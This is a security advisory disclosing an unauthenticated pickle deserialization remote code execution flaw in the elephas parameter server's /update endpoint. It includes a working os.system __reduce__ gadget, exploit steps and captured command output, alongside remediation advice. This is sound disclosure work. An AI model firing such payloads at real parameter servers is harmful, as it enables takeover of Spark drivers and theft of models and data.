# VDR-018: Unauthenticated Pickle Deserialization RCE in maxpumperla/elephas

- **Target**: [maxpumperla/elephas](https://github.com/maxpumperla/elephas)
- **Severity**: Critical (CVSS 3.1: 9.8)
- **CWE**: [CWE-502](https://cwe.mitre.org/data/definitions/502.html) - Deserialization of Untrusted Data
- **CVE**: [CVE-2026-51093](https://www.cve.org/CVERecord?id=CVE-2026-51093)
- **CVSS Vector**: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
- **Discovered**: 2026-06-05
- **Researcher**: Dennis Sepede - [Securitix Solutions](https://securitixsolutions.com)

## Summary

`elephas` is a distributed deep-learning library that runs Keras/TensorFlow model
training on Apache Spark. Its `HttpServer` parameter server exposes a Flask HTTP
endpoint `POST /update` that deserializes the **raw request body with
`pickle.loads(request.data)` without any authentication**. Python's `pickle`
executes arbitrary code during deserialization (via `__reduce__`), so any host able
to reach the endpoint can achieve remote code execution in the parameter-server
process. The server is started on the Spark driver host and binds to that host's
routable network interface (`determine_master()` returns
`gethostbyname(gethostname())`, i.e. the LAN IP, when `SPARK_LOCAL_IP` is unset),
making it reachable by any worker or any host on the cluster network. A companion
`GET /parameters` route returns the pickled model weights, enabling model/data
exfiltration. The vulnerability is present in the latest release **3.2.0**
(sink commit `fc45f33`) and the library remains pip-installable and widely vendored.

## Affected Component

- `elephas/parameter/server.py:118` - `pickle.loads(request.data)` in the `/update`
  handler (`handle_update_parameters`) of the `HttpServer` parameter server.
- Route declared at `elephas/parameter/server.py:116`
  (`@app.route('/update', methods=['POST'])`).
- Companion data-leak route: `elephas/parameter/server.py:106-114`
  (`GET /parameters` returns `pickle.dumps(self.weights, -1)`).
- Network bind helper: `elephas/utils/sockets.py:6-21` (`determine_master`) -> the
  server binds to the host's routable LAN IP via
  `self.app.run(host=host, ...)` at `server.py:133-136`.
- **Secondary sink (same root cause, SocketServer path):**
  `elephas/utils/sockets.py:55` `receive()` calls `pickle.loads(serialized_data)`
  on bytes read from the socket; used by `SocketServer.update_parameters` at
  `server.py:200-202`. This advisory focuses on the unauthenticated HTTP `/update`
  vector; the socket path is equivalently exploitable and shares the fix.

Affected version: **3.2.0** (current latest release; commit `fc45f33` shipping the
sink is an ancestor of the `3.2.0` tag). All prior releases containing the
`HttpServer`/`SocketServer` parameter servers are affected.

## Details

### Source -> Sink

The parameter server is instantiated and started during distributed training. The
HTTP variant runs a Flask app in a separate `multiprocessing.Process`:

```python
# elephas/parameter/server.py
class HttpServer(BaseParameterServer):
    def __init__(self, model, port, mode, **kwargs):
        ...
        self.server = Process(target=self.start_flask_service)   # :80

    def start(self):
        self.server.start()                                      # :83
        self.master_url = determine_master(self.port)            # :84

    def start_flask_service(self):
        app = Flask(__name__)
        ...
        @app.route('/parameters', methods=['GET'])               # :106
        def handle_get_parameters():
            self.pickled_weights = pickle.dumps(self.weights, -1) # :110  (weight leak)
            ...
            return pickled_weights                                # :114

        @app.route('/update', methods=['POST'])                  # :116
        def handle_update_parameters():
            delta = pickle.loads(request.data)                   # :118  <-- SINK (CWE-502)
            ...
            self.weights = subtract_params(weights_before, delta)
            return 'Update done'                                  # :131

        master_url = determine_master(self.port)                 # :133
        host = master_url.split(':')[0]
        self.app.run(host=host, debug=self.debug, port=self.port, # :135
                     threaded=self.threaded, use_reloader=self.use_reloader)
```

`request.data` is the **raw, attacker-controlled HTTP body**. It flows directly into
`pickle.loads` with no signing, no allow-listing (`find_class` is not restricted),
and **no authentication of any kind** — there is no token, cookie, header check, or
network ACL in the handler or anywhere in `elephas/parameter/`.

### Exposure model (why this is remote / network-reachable)

The bind host is computed by `determine_master()`:

```python
# elephas/utils/sockets.py
def determine_master(port=4000):
    if os.environ.get('SPARK_LOCAL_IP'):
        return os.environ['SPARK_LOCAL_IP'] + ":" + str(port)
    else:
        return gethostbyname(gethostname()) + ":" + str(port)   # routable LAN IP
```

In a normal Spark deployment `SPARK_LOCAL_IP` is the driver's cluster IP (or is
unset, in which case the code resolves the host's own routable IP). Either way the
Flask server binds to a **non-loopback, cluster-routable interface** — this is by
design, because the whole point of the parameter server is that Spark **workers on
other hosts** connect to it to push gradients. Consequently the deserialization sink
is reachable by:

- any Spark worker node,
- any container/pod sharing the cluster network,
- any host that can route to the driver on the parameter-server port,

without credentials. This is the classic distributed-deep-learning parameter-server
RCE: compromise/control of any one node (or a malicious tenant on the same network)
yields code execution in the **driver** process, which is typically the most
privileged, credential-bearing node in the job (cloud metadata, Spark secrets, model
artifacts, training data).

### Pickle gadget mechanics

Python `pickle` reconstructs objects by calling the callable returned from an
object's `__reduce__`. An attacker defines:

```python
class RCE:
    def __reduce__(self):
        return (os.system, ("id; <payload>",))
```

`pickle.dumps(RCE())` produces a byte stream that, when passed to `pickle.loads`,
invokes `os.system("id; <payload>")` **during** deserialization — before `elephas`
ever inspects `delta`. The returned `delta` is merely the `os.system` exit code
(an `int`), but the side-effect (command execution) has already occurred.

## Proof of Concept

**Important labeling.** Because the shipped sink is wrapped in a heavyweight
TensorFlow/Keras/Spark stack, the PoC uses a **faithful minimal harness**: the
`/update` and `/parameters` Flask route handlers in `poc/harness_server.py` are
copied **verbatim** from `elephas/parameter/server.py` (release 3.2.0), and
`determine_master()` is copied verbatim from `elephas/utils/sockets.py`. Only the
TF/Keras objects (`self.master_network`, `subtract_params`, locks) are omitted —
they are irrelevant to the sink, since `pickle.loads(request.data)` runs on the raw
body *before* any of them are reached. The harness therefore exercises the
**identical sink on the identical code path**; see `NOTES.md` for the
executed-vs-argued statement and `poc/OUTPUT.txt` for the unedited captured output.

### Steps

1. Start the parameter server (here, the faithful harness on the assigned port 18808):

   ```
   python poc/harness_server.py
   ```

   Startup confirms the production bind target:
   ```
   real determine_master(18808) would bind production server to: 192.168.56.1:18808
   ```
   (a routable LAN IP — any cluster host can reach it).

2. Fire the exploit (no credentials):

   ```
   python poc/exploit.py 127.0.0.1 18808
   ```

   The exploit builds `pickle.dumps(RCE())` where
   `RCE.__reduce__ -> (os.system, (cmd,))`, optionally leaks weights via
   `GET /parameters`, then sends the pickle as the raw body of `POST /update`.

### Payload (gadget)

```python
class RCE:
    def __reduce__(self):
        return (os.system, ("id; whoami; uname -a; <write sentinel>",))

payload = pickle.dumps(RCE())
# POST payload as the raw body to /update  (Content-Type irrelevant; request.data is raw)
```

### Real captured output (excerpt — full in `poc/OUTPUT.txt`)

Exploit client:
```
[+] GET /parameters leaked weights object: [b'fake-model-weights-blob']
[+] POST /update HTTP 200 -> Update done (delta type='int')
```

Server-side sentinel file written **by the victim process** during `pickle.loads`:
```
=== VDR-011 RCE PROOF (elephas /update pickle.loads) ===
uid=197609(Dennis) gid=197121 groups=197121
Dennis
MINGW64_NT-10.0-26200 DESKTOP-AS05E6K 3.5.4-395fda67.x86_64 2024-11-25 09:49 UTC x86_64 Msys
DESKTOP-AS05E6K
```

The presence of real `id` / `whoami` / `uname` / `hostname` output, produced by the
server process as a side effect of deserializing the attacker body, confirms
unauthenticated arbitrary command execution. The `/update` response reporting the
deserialized `delta` as an `int` (the `os.system` return code) is corroborating
evidence that the callable fired rather than a legitimate gradient being applied.

## Impact

- **Unauthenticated remote code execution** in the parameter-server (Spark **driver**)
  process, from any host that can route to the parameter-server port — i.e. any Spark
  worker or any neighbor on the cluster network. No credentials, tokens, or user
  interaction are required.
- **Full driver compromise**: the driver typically holds cloud credentials/instance
  metadata access, Spark secrets, the full model, and the training dataset. RCE here
  enables lateral movement across the whole cluster and the cloud account.
- **Model and training-data theft**: `GET /parameters` returns the pickled weights
  without authentication, allowing direct model exfiltration even independent of the
  RCE; post-RCE the attacker has arbitrary filesystem/network access.
- **Integrity / availability**: gradients/weights can be silently poisoned (model
  backdooring) and the process can be crashed or held for ransom.

## Recommendation

- **Do not deserialize untrusted input with `pickle`.** Replace the wire format with a
  safe serializer for numeric arrays: NumPy `.npz` (`np.load(..., allow_pickle=False)`),
  Apache Arrow, or `msgpack`/Protobuf with strict schema and length/shape validation.
  Never call `pickle.loads`/`pickle.dumps` on network data (this also applies to the
  `SocketServer` path in `elephas/utils/sockets.py`).
- **Authenticate workers.** Require a per-job shared secret / bearer token (constant-time
  compared) on `/update` and `/parameters`, distributed via the Spark job config, and
  reject unauthenticated requests.
- **Restrict the network exposure.** Bind to the minimum necessary interface, enforce
  mutual TLS (mTLS) between driver and workers, and/or place the parameter-server port
  behind cluster network policy (security groups / NetworkPolicy) so only worker nodes
  can reach it.
- **Defense in depth.** Run the driver with least privilege (no ambient cloud
  credentials where avoidable) and disable Flask `debug=True` (the current default in
  `HttpServer.__init__`), which additionally exposes the Werkzeug debugger.

## Status

| Date | Event |
|------|-------|
| 2026-06-05 | Vulnerability discovered during source code audit |
| 2026-06-05 | Working PoC confirmed |
| TBD | CVE request submitted to MITRE CNA-LR |

## References

- [CWE-502](https://cwe.mitre.org/data/definitions/502.html)
- [Upstream repository](https://github.com/maxpumperla/elephas)
